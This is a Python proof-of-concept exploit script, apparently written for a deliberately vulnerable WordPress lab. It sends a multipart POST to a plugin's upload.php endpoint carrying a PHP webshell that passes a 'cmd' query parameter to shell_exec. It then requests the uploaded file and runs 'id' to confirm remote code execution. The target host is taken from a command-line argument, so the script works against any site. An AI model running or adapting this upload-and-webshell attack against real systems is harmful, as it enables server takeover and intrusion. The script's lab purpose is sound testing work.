#!/usr/bin/env python3
"""WordPress File Upload RCE PoC (CVE-2023-32243)

Demonstrates unrestricted file upload leading to remote code execution.
This is an educational proof-of-concept for the KZ-Sploitable lab environment.
"""

import sys
import urllib.request
import urllib.parse


WEBSHELL_CONTENT = b"""<?php echo "KZ-PoC-Shell"; echo shell_exec($_GET['cmd'] ?? 'id'); ?>"""


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://kz-wordpress:80"
    print(f"[*] Target: {target}")
    print(f"[*] CVE: CVE-2023-32243")
    print(f"[*] Type: Unrestricted File Upload -> RCE")
    print()

    boundary = "----KZSploitBoundary"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="kz-poc.php"\r\n'
        f"Content-Type: application/x-php\r\n\r\n"
    ).encode() + WEBSHELL_CONTENT + f"\r\n--{boundary}--\r\n".encode()

    upload_url = f"{target}/wp-content/plugins/vulnerable-plugin/upload.php"

    print(f"[+] Uploading webshell to: {upload_url}")

    try:
        req = urllib.request.Request(upload_url, data=body, method="POST")
        req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        req.add_header("User-Agent", "KZ-Sploitable-PoC/1.0")

        with urllib.request.urlopen(req, timeout=10) as resp:
            print(f"[+] Upload response: {resp.status}")
            print(resp.read().decode("utf-8", errors="replace")[:300])

        shell_url = f"{target}/wp-content/uploads/kz-poc.php?cmd=id"
        print(f"\n[+] Triggering shell: {shell_url}")

        req2 = urllib.request.Request(shell_url)
        with urllib.request.urlopen(req2, timeout=10) as resp2:
            output = resp2.read().decode("utf-8", errors="replace")
            print(f"[+] Shell output: {output}")
            print("[+] SUCCESS: Remote code execution achieved")

    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error {e.code}: {e.reason}")
        print(f"[*] Upload endpoint may not exist (patched profile)")
    except urllib.error.URLError as e:
        print(f"[!] Connection failed: {e.reason}")
        print(f"[*] Ensure the WordPress container is running")
    except Exception as e:
        print(f"[!] Error: {e}")

    print()
    print("[*] PoC execution complete")


if __name__ == "__main__":
    main()
